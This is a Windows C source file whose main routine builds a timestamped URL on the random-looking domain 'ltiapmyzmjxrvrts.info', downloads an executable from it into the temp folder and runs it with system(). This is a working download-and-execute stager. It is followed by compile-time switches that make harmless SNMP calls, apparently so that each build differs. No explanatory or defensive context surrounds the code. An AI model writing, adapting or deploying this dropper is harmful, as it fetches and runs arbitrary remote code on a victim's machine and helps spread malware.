#include <Windows.h>
#include <strsafe.h>
#include <urlmon.h>
#include <stdio.h>
#include <snmp.h>

//simple portability support
#ifdef _MSC_VER
#pragma  comment(lib,"Urlmon.lib")
#endif

#define URLLEN 128 //some spare bytes
#define ISO_TIME_LEN 32 //some spare bytes
#define ISO_TIME_FORMAT  "%04i%02i%02iT%02i%02i%02i_%03i"
#define DOMAINNAME "ltiapmyzmjxrvrts.info"

#undef UNICODE

//LocalFree required, but who cares
PSTR SystemTimeToISO8601_ms(SYSTEMTIME stTime)
{
	PSTR pszISOTimeZ;
	pszISOTimeZ = LocalAlloc(LPTR, (ISO_TIME_LEN + 3));
	if (pszISOTimeZ)
	{
		StringCchPrintfA(
			pszISOTimeZ,
			ISO_TIME_LEN + 3,
			ISO_TIME_FORMAT,
			stTime.wYear,
			stTime.wMonth,
			stTime.wDay,
			stTime.wHour,
			stTime.wMinute,
			stTime.wSecond,
			stTime.wMilliseconds);
	}
	return pszISOTimeZ;
}

//LocalFree required, but who cares
PSTR GetCurrentTimeZ(void)
{
	SYSTEMTIME stTime;
	GetSystemTime(&stTime);
	return (SystemTimeToISO8601_ms(stTime));
}


int main(void)
{
	HRESULT hr = 0;

	PSTR pszTime;
	PSTR pszUrl;
	PSTR pszDest;
	PSTR pszEnvDest;

	Sleep(1000);

	pszTime = GetCurrentTimeZ();
	pszUrl = LocalAlloc(LPTR, URLLEN);
	pszDest = LocalAlloc(LPTR, MAX_PATH);
	pszEnvDest = LocalAlloc(LPTR, MAX_PATH);

	if (!pszEnvDest || !pszUrl)
	{
		//crash, what else
		_exit(ERROR_NOT_ENOUGH_MEMORY);
	}


	StringCchPrintfA(pszEnvDest, MAX_PATH, "%%temp%%\\%s.exe", pszTime);
	ExpandEnvironmentStringsA(pszEnvDest, pszDest, MAX_PATH);
	StringCchPrintfA(pszUrl, URLLEN, "http://%s.%s/v4/%s.exe", pszTime, DOMAINNAME, pszTime);

	hr = URLDownloadToFileA(NULL, pszUrl, pszDest, 0, NULL);

	printf("%s dowloaded. Result %ld\r\n", pszUrl, hr);
	Sleep(1000);
	system(pszDest);


	// variable part at the very end to make code run even if this part fails.
	// defines above are set during compilation
	/*
	#define randomstring "randomstring"
	#define d0	"d0"
	#define d1	"d1"
	#define d2	"d2"
	#define d3	"d3"
	#define d4	"d4"
	#define d5	"d5"
	#define d6	"d6"
	#define d7	"d7"
	#define d8	"d8"
	#define d9	"d9"
	#define da	"da"
	#define db	"db"
	#define dc	"dc"
	#define dd	"dd"
	#define de	"de"
	#define df	"df"
	*/

#ifdef randomstring
	printf("Random string: %s\r\n", randomstring);
#endif


#ifdef d0
	printf("d0=%s, executing... ", d0);
	SnmpUtilOctetsCpy(0, 0);
	printf("Done.\r\n");
#endif

#ifdef d1
	printf("d1=%s, executing... ", d1);
	SnmpUtilOctetsFree(0);
	printf("Done.\r\n");
#endif

#ifdef d2
	printf("d2=%s, executing... ", d2);
	SnmpUtilOidCpy(0, 0);
	printf("Done.\r\n");
#endif

#ifdef d3
	printf("d3=%s, executing... ", d3);
	SnmpUtilOidAppend(0, 0);
	printf("Done.\r\n");
#endif

#ifdef d4
	printf("d4=%s, executing... ", d4);
	SnmpUtilVarBindCpy(0, 0);
	printf("Done.\r\n");
#endif

#ifdef d5
	printf("d5=%s, executing... ", d5);
	SnmpUtilOidFree(0);
	printf("Done.\r\n");
#endif

#ifdef d6
	printf("d6=%s, executing... ", d6);
	SnmpUtilPrintOid(0);
	printf("Done.\r\n");
#endif

#ifdef d7
	printf("d7=%s, executing... ", d7);
	SnmpUtilPrintAsnAny(0);
	printf("Done.\r\n");
#endif

#ifdef d8
	printf("d8=%s, executing... ", d8);
	SnmpUtilMemFree(0);
	printf("Done.\r\n");
#endif

#ifdef d9
	printf("d9=%s, executing... ", d9);
	SnmpUtilMemReAlloc(0, 0);
	printf("Done.\r\n");
#endif

#ifdef da
	printf("da=%s, executing... ", da);
	SnmpSvcGetUptime();
	printf("Done.\r\n");
#endif

#ifdef db
	printf("db=%s, executing... ", db);
	SnmpUtilVarBindFree(0);
	printf("Done.\r\n");
#endif

#ifdef dc
	printf("dc=%s, executing... ", dc);
	SnmpUtilOidNCmp(0, 0, 0);
	printf("Done.\r\n");
#endif

#ifdef dd
	printf("dd=%s, executing... ", dd);
	SnmpUtilOidToA(0);
	printf("Done.\r\n");
#endif

#ifdef de
	printf("de=%s, executing... ", de);
	SnmpUtilIdsToA(0, 0);
	printf("Done.\r\n");
#endif

#ifdef df
	printf("df=%s, executing... ", df);
	SnmpUtilOctetsNCmp(0, 0, 0);
	printf("Done.\r\n");
#endif

	return 0;
}
